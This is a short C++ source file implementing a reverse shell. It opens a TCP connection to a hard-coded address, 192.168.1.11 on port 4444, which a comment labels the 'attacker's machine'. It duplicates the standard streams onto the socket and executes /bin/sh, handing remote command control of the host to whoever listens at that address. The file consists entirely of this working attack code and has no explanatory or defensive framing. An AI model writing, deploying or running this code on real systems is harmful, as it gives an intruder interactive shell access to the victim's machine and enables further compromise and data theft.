#include <iostream>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main() {
    const char* ip = "192.168.1.11";
    int port = 4444;

    // Address structure
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_aton(ip, &addr.sin_addr);

    // Socket creation
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Connect to attacker's machine
    if (connect(sockfd, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) < 0) {
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }

    // Redirect standard input, output, and error to the socket
    for (int i = 0; i < 3; i++) {
        if (dup2(sockfd, i) < 0) {
            perror("dup2 failed");
            exit(EXIT_FAILURE);
        }
    }

    // Execute shell
    char *const argv[] = {const_cast<char*>("/bin/sh"), nullptr};
    if (execve("/bin/sh", argv, nullptr) < 0) {
        perror("execve failed");
        exit(EXIT_FAILURE);
    }

    return 0;
}
